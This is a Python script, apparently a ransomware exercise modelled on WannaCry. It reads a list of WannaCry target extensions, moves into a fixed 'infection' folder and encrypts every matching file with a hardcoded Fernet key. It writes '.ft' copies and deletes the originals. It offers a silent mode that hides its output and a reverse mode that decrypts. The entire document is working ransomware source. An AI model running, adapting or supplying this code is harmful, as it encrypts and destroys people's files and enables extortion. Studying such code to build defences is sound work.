import sys
import os
from cryptography.fernet import Fernet
import glob


def load_wannacry_extensions():
    try:
        with open("wannacry_ex.txt") as f:
            ex = [line.rstrip() for line in f]
            return ex
    except FileNotFoundError:
        return None


key = "93mBgdBnWdvw_6EmsIsv2jODf6jSPatTXuquA7GbXQ8="
extensions = load_wannacry_extensions()
if not extensions:
    print("Error with wannacry_ex.txt")
    exit(1)
fernet = Fernet(key)
silent = False
try:
    os.chdir("/home/ayagmur/infection")
except FileNotFoundError:
    print("No folder infection")
    exit(1)


def encrypt(file):
    try:
        with open(file, 'rb') as f:
            if not silent:
                print(f"Encrypting {file}")
            data = f.read()
            encrypted = fernet.encrypt(data)
            newfile = file
            if not file.endswith(".ft"):
                newfile = file + ".ft"
            with open(newfile, 'wb') as f2:
                f2.write(encrypted)
    except:
        print(f"Error with {file}")
        return
    os.remove(file)


def decrypt(file):
    try:
        with open(file, "rb") as fd:
            print(f"Decrypting {file}")
            encrypted_data = fd.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            with open(file[:-3], "wb") as fd2:
                fd2.write(decrypted_data)
            os.remove(file)
    except:
        print(f"Error with {file}")


def iterator_in_folder(mode):
    files_to_act = []
    if mode == 0:
        for ex in extensions:
            files_to_act.extend(glob.glob("*" + ex))
        for file in files_to_act:
            encrypt(file)
    else:
        files_to_act.extend(glob.glob("*.ft"))
        for file in files_to_act:
            decrypt(file)


if len(sys.argv) > 1:
    if sys.argv[1] == "-help" or sys.argv[1] == "-h":
        print("-version to show the version, -reverse to decrypt, -silent to dont print any output")
    elif sys.argv[1] == "-version" or sys.argv[1] == "-v":
        print("version 1.0")
    elif sys.argv[1] == "-reverse" or sys.argv[1] == "-r":
        iterator_in_folder(1)
    elif sys.argv[1] == "-silent" or sys.argv[1] == "-s":
        silent = True
        iterator_in_folder(0)
    else:
        print("unknown option")
else:
    iterator_in_folder(0)